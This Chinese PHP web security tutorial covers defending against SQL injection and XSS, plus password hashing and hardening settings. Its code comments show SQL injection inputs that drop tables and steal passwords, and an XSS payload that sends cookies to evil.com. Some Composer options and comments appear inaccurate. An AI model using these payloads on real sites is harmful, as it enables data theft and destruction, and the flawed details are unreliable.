# Web 安全

PHP 应用面临的 Web 安全威胁与 OWASP Top 10 密切相关。本节深入讲解 SQL 注入、XSS、CSRF、密码安全、Session 安全和文件上传漏洞的防御方法。

## SQL 注入防御

SQL 注入是最危险的 Web 安全漏洞之一，攻击者通过注入恶意 SQL 片段来操纵数据库查询。

```php
<?php
declare(strict_types=1);

// === 危险：SQL 拼接 ===
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id = $id";
// 攻击者输入: 1 OR 1=1 → 返回所有用户
// 攻击者输入: 1; DROP TABLE users;-- → 删除表
// 攻击者输入: 1 UNION SELECT password FROM admin-- → 窃取密码

// === 防御方案 1：PDO 预处理语句（推荐）===
$pdo = new PDO('mysql:host=localhost;dbname=app;charset=utf8mb4', 'user', 'pass', [
    PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_EMULATE_PREPARES => false,  // 关键：使用原生预处理
]);

$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id AND status = :status");
$stmt->execute([
    'id' => $_GET['id'],
    'status' => 'active',
]);
$user = $stmt->fetch(PDO::FETCH_ASSOC);

// 预处理为什么安全？
// 1. SQL 模板和参数分开发送给数据库
// 2. 参数值永远不会被解析为 SQL 代码
// 3. 即使参数包含 "1; DROP TABLE"，它只被当作字符串值

// === 防御方案 2：使用 ORM（如 Eloquent）===
// Eloquent 底层使用预处理语句
$user = User::where('id', request('id'))->first();

// 表名/列名不能预处理，需要白名单验证
$allowedColumns = ['name', 'email', 'created_at'];
$column = request('sort');
if (!in_array($column, $allowedColumns, true)) {
    $column = 'created_at';  // 默认值
}
$users = User::orderBy($column)->get();

// 数字类型的强制转换
$page = (int) ($_GET['page'] ?? 1);
$limit = max(1, min(100, (int) ($_GET['limit'] ?? 20)));
```

::: tip 提示
PDO 预处理的安全性取决于 `PDO::ATTR_EMULATE_PREPARES => false`。MySQL 默认开启模拟预处理，此时 PDO 会在客户端将参数拼接到 SQL 中发送，而不是使用 MySQL 原生的 PREPARE/EXECUTE 协议。务必禁用模拟预处理。
:::

## XSS 防御

XSS（Cross-Site Scripting）攻击通过注入恶意 JavaScript 代码来窃取用户 Cookie、会话或执行其他恶意操作。

```php
<?php
declare(strict_types=1);

// === 危险：未转义输出 ===
$name = $_GET['name'];
echo "Hello, $name";
// 攻击者输入: <script>document.location='http://evil.com/steal?c='+document.cookie</script>

// === 防御方案 1：htmlspecialchars（PHP 原生）===
function e(string $value): string
{
    return htmlspecialchars($value, ENT_QUOTES | ENT_HTML5, 'UTF-8');
}
echo "Hello, " . e($name);
// 输出: Hello, &lt;script&gt;...&lt;/script&gt;（安全的文本）

// === 防御方案 2：模板引擎自动转义（Blade）===
// Laravel Blade 默认自动转义
// {{ $name }}  → 自动转义
// {!! $name !!} → 不转义（仅用于可信 HTML）

// === 防御方案 3：Content Security Policy（CSP）===
// 限制浏览器只执行指定来源的脚本
header("Content-Security-Policy: default-src 'self'; script-src 'self' cdn.example.com; style-src 'self' 'unsafe-inline'");

// === 防御方案 4：HTML 净化（允许部分 HTML）===
// 使用 HTML Purifier 库
$config = HTMLPurifier_Config::createDefault();
$config->set('HTML.Allowed', 'p,br,b,i,em,strong,a[href|title]');
$purifier = new HTMLPurifier($config);
$cleanHtml = $purifier->purify($dirtyHtml);

// === JSON 输出安全 ===
// 防止 JSON 被当作 HTML 执行
$data = ['name' => '</script><script>alert(1)'];
header('Content-Type: application/json; charset=utf-8');
echo json_encode($data, JSON_HEX_TAG | JSON_HEX_AMP);
// JSON_HEX_TAG 将 < > 编码为 < >
```

::: warning 警告
永远不要信任用户输入。即使数据来自数据库，如果数据库中存储了用户提交的内容，输出时也必须转义。XSS 防御的原则是"在输出时转义"，而非"在输入时过滤"。
:::

## 密码哈希

```php
<?php
declare(strict_types=1);

// === password_hash — 使用 bcrypt（默认）或 Argon2id ===

// 注册时：哈希密码
$password = $_POST['password'];
$hash = password_hash($password, PASSWORD_DEFAULT);
// PASSWORD_DEFAULT 会自动选择最佳算法（PHP 7.2+ 是 bcrypt，未来可能是 Argon2id）

// 使用 Argon2id（PHP 7.2+，更安全）
$hash = password_hash($password, PASSWORD_ARGON2ID, [
    'memory_cost' => 65536,  // 64MB
    'time_cost' => 4,        // 迭代次数
    'threads' => 1,          // 并行线程
]);

// 登录时：验证密码
$inputPassword = $_POST['password'];
$storedHash = $user->password;

if (password_verify($inputPassword, $storedHash)) {
    echo "Login successful";

    // 检查是否需要重新哈希（算法升级）
    if (password_needs_rehash($storedHash, PASSWORD_DEFAULT)) {
        $newHash = password_hash($inputPassword, PASSWORD_DEFAULT);
        // 更新数据库中的哈希值
        DB::table('users')->where('id', $user->id)->update(['password' => $newHash]);
    }
} else {
    echo "Invalid credentials";
}
```

::: warning 警告
绝对不要使用 MD5、SHA1 或自定义哈希方案存储密码。`md5($password)` 和 `sha1($password)` 无法抵御彩虹表攻击和 GPU 暴力破解。`password_hash()` 内置了随机盐值，是唯一正确的密码哈希方案。
:::

## 安全加固清单

```php
<?php
// === 完整的安全配置 ===

// 1. 强制 HTTPS
if (!isset($_SERVER['HTTPS']) || $_SERVER['HTTPS'] !== 'on') {
    header('Location: https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
    exit;
}

// 2. 安全 Header
header('Strict-Transport-Security: max-age=31536000; includeSubDomains');
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('X-XSS-Protection: 1; mode=block');
header('Referrer-Policy: strict-origin-when-cross-origin');

// 3. 错误处理（生产环境）
ini_set('display_errors', '0');
ini_set('log_errors', '1');
ini_set('error_log', '/var/log/php/error.log');

// 4. Session 安全
ini_set('session.use_strict_mode', '1');
ini_set('session.use_only_cookies', '1');
ini_set('session.use_trans_sid', '0');
ini_set('session.cookie_httponly', '1');
ini_set('session.cookie_secure', '1');
ini_set('session.cookie_samesite', 'Lax');

// 5. 依赖安全审计
// composer audit — 检查已知漏洞
// 或使用 SensioLabs Security Checker
// composer require --dev enlightn/security-checker
// vendor/bin/security-checker security:check
```

## Composer 依赖安全审计

```bash
# PHP 8.1+ 内置 Composer 审计命令
composer audit

# 显示所有漏洞（包括间接依赖）
composer audit --audit-format=symfony

# 自动修复
composer audit --fix

# 生成 JSON 报告
composer audit --format=json > audit-report.json
```

## OWASP Top 10 对照

| OWASP 2021 | PHP 防御措施 |
|-------------|-------------|
| A01 权限控制失效 | Laravel Gate/Policy、中间件鉴权 |
| A02 加密失败 | password_hash、HTTPS、openssl |
| A03 注入 | PDO 预处理、Eloquent ORM |
| A04 不安全设计 | 输入验证、Rate Limiting |
| A05 安全配置错误 | 关闭 display_errors、禁用危险函数 |
| A06 脆弱过时组件 | `composer audit`、定期更新 |
| A07 认证失效 | Session 再生、密码策略、MFA |
| A08 数据完整性失效 | CSRF Token、签名 Cookie |
| A09 日志监控不足 | Monolog、异常上报 |
| A10 SSRF | URL 白名单、禁止内网请求 |
